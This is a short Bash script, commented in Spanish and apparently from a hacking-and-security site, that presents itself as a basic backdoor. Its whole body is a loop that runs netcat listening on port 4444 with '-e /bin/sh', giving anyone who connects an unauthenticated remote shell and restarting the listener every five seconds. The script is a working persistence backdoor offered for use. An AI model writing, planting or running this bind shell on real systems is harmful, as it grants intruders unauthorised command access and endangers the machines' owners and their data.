#!/bin/bash
# Backdoor básico compatible con Bash 1.0.x
# Utiliza Netcat para escuchar en un puerto y permite conexiones con cliente Telnet
# ;) https://hackingyseguridad.github.io/

PUERTO=4444
SHELL=/bin/sh

while true; do
  nc -l -p $PUERTO -e $SHELL
  sleep 5
done
